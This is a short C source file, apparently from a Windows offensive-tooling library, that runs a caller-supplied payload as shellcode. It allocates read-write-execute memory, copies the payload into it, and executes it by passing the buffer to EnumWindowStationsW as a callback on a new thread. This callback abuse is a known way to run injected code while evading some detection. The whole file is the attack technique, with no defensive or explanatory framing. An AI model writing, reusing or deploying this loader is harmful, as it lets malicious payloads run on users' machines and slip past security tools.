#include "Win32Helper.h"

VOID InvokeEnumWindowStationsWCallbackRoutine(LPVOID lpParameter)
{
	EnumWindowStationsW((WINSTAENUMPROCW)lpParameter, NULL);
}

BOOL MpfSceViaEnumWindowStationsW(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes)
{
	LPVOID BinAddress = NULL;

	BinAddress = VirtualAlloc(NULL, PayloadSizeInBytes, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (BinAddress == NULL)
		return FALSE;

	CopyMemoryEx(BinAddress, Payload, PayloadSizeInBytes);

	CreateThreadAndWaitForCompletion((LPTHREAD_START_ROUTINE)InvokeEnumWindowStationsWCallbackRoutine, BinAddress, INFINITE);

	return TRUE;
}